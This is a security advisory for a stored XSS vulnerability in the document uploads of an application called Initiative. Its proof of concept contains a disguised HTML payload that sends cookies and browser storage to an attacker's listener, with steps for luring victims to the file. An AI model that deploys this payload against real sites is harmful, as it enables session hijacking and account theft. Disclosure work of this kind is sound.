# CVE-2026-28274: Token Theft via Stored XSS in Document Uploads

| Property | Details |
| :--- | :--- |
| **Service** | Initiative |
| **CVSS Score** | 8.7 (High) |
| **Published** | February 26, 2026 |
| **Affected** | `< 0.32.2` |
| **Patched** | `0.32.4` |


## Technical Summary

The application is vulnerable to Stored Cross-Site Scripting (XSS) in the document upload functionality. Any user with upload permissions within the "Initiatives" section can upload a malicious `.html` or `.htm` file as a document. Because the uploaded HTML file is served under the application's origin without proper sandboxing, the embedded JavaScript executes in the context of the application.

As a result, authentication tokens, session cookies, or other sensitive data can be exfiltrated to an attacker-controlled server. Additionally, since the uploaded file is hosted under the application's domain, simply sharing the direct file link may result in execution of the malicious script when accessed.

## Proof of Concept

### Proof of Concept

1. Create a malicious HTML file containing JavaScript. 
```html
<!DOCTYPE html><html><body style="background:#f4f4f4;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif">
<div style="text-align:center;color:#666">
    <div class="s"></div>
    <p>Loading attachment...</p>
</div>
<style>
    .s { border:4px solid #ddd; border-top:4px solid #3498db; border-radius:50%; width:30px; height:30px; animation:r 1s linear infinite; margin:0 auto 10px }
    @keyframes r { to { transform:rotate(360deg) } }
</style>
<script>
(function(){
    // Collecting data (c=cookies, l=localStorage, s=sessionStorage)
    let d = btoa(JSON.stringify({
        c: document.cookie,
        l: localStorage,
        s: sessionStorage,
        u: location.href
    }));
    // Attacker's IP and port (172.17.0.1:80)
    new Image().src = 'http://172.17.0.1:80/?d=' + d;
})();
</script></body></html>
```

2. Upload the file through the Document Upload feature in "Initiatives" 
3. Make the file visible to others.
4. Start a simple HTTP listener to capture incoming requests.

```bash
python3 -m http.server <PORT>
```
5. Send the link to a target user or wait for a user to open the document in a new tab.
6. Get the victim’s session data.
7. Decode exfiltrated data (e.g., Base64).

![xss](https://github.com/user-attachments/assets/44982fff-769b-40b6-89ce-5cd3c8b5bc63)
  


https://github.com/user-attachments/assets/b58c4139-9315-489d-89a2-0d5b5b120dda



## Impact

Since the file is hosted under the trusted application domain, the attack bypasses typical user suspicion and leverages same-origin trust. The victim does not need to be related to the original initiative or document. Depending on how the extracted authentication token is validated by the backend, this may allow session hijacking or full account compromise within the scope of the affected user.

- Session token exposure
- Session hijacking
- Unauthorized actions within the scope of the victim’s account


Mitigation: [OWASP Cross-Site Scripting Prevention Cheat Sheet.](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Additional Impact

JWT access tokens remain valid until expiration and are not invalidated on logout. No observable revocation or rotation mechanism is present. If a token is exfiltrated via the XSS vulnerability, it remains usable until expiry, allowing persistent session hijacking even after the victim logs out.

## Reference

[Official Security Advisory](https://github.com/Morelitea/initiative/security/advisories/GHSA-v38c-x27x-p584)

---
